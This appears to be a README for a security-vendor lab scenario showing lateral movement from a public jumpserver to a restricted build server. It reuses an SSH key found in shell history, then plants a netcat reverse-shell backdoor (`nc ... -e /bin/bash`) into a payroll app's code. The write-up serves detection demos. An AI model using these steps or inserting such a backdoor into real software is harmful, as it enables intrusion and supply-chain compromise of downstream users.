# Multi-Machine Lateral Movement

This scenario shows an attacker gaining access to a public-facing server outside of the cluster, and using it to connect to a more restricted build environment.

## Pre-requisites

This scenario requires two machines to be set up outside of the Kubernetes cluster using the install script. To begin, you will need the IP address and SSH key to access the first server (or "jumpserver").

## Running the Exploit

There are two machines in this scenario: a "jumpserver" and a build server (`buildbox`). The build server is supposed to be restricted, and can only be accessed from machines within the same account. To use the build server for publishing new versions of private images, developers first connect to a public-facing jumpserver using SSH. From there, they can connect to the build server.

In this scenario, we start as the attacker, who has just acquired the SSH key for the jumpserver. Let's start by connecting to the machine.

```sh
ssh -i ~/path/to/jumpserver/key JUMPSERVER_USER@JUMPSERVER_IP
```

Now, take a look at the history:

```sh
history
```
```
    1  ls -la
    2  hostname
    3  systemctl status sshd.service 
    4  ls .ssh/
    5  ssh-keygen
    6  cat .ssh/buildbox_id.pub 
    7  ssh -i ~/.ssh/buildbox_id root@203.0.113.45
    8  history
```

The developers used the SSH key `buildbox_id` to access the build server. It also looks like the SSH key is still present:

```sh
ls ~/.ssh
```
```
authorized_keys  buildbox_id
```

So now, we can connect to the build server:

```sh
# note: use the command that appeared in your history for a valid user/IP
ssh -i ~/.ssh/buildbox_id root@203.0.113.45
```

If we look at the history, we can see some of the old packages that were built here:

```sh
history
```
```
    1  git clone git@github.com:example/build.git 
    2  cd build
    3  make push-container
    4  cd ..
    5  rm -rf build
    6  git clone git@github.com:example/payroll-app.git 
    7  cd payroll-app
    8  make build
    9  make push-container
   10  cd payroll-app
   11  git pull
   12  make push-container
   13  history
   14  ls ~/.ssh
   15  ls ~/payroll-app/
   16  cat payroll-app/Makefile 
   17  history
```

Given the build server is fetching private code using SSH, we could use the SSH keys here to login to GitHub and view the company's repositories:

```sh
ls ~/.ssh/
```
```
authorized_keys  github-login
```

Instead, let's can take a look at the `payroll-app` directory to get some more details about how the build were handled:

```sh
ls ~/payroll-app/
```
```sh
cat payroll-app/Makefile
```

And, given the access on this machine, we could edit the `payroll-app` package to add a backdoor that we could access, and then push a new version of the package.

As an example, let's could install netcat:

```sh
sudo yum install nmap-ncat
```

And validate that we can use `nc`:

```sh
nc --version
```

Then, we can edit the payroll app to give us the backdoor, such as connecting to this machine with a reverse shell.

```py
# file: payroll-app/payroll-calc.py
# ...
import os; os.system("nc 203.0.113.45 2222 -e /bin/bash")
```

For this demo, the buildbox is not actually set up to generate new images, but at this point is where we would build the new image, start a listening server, and wait for someone to deploy the backdoor:

```sh
nc -l -p 2222
```

To see a full supply-chain exploitation and how Spyderbat detects it, visit the [supply chain attack demo](../supply_chain/).

## Investigation

[[TODO]]

## Further Reading

- [Supply Chain Attack Scenario](../supply_chain/)
- [End-to-End Demo Scenario](../end_to_end/)
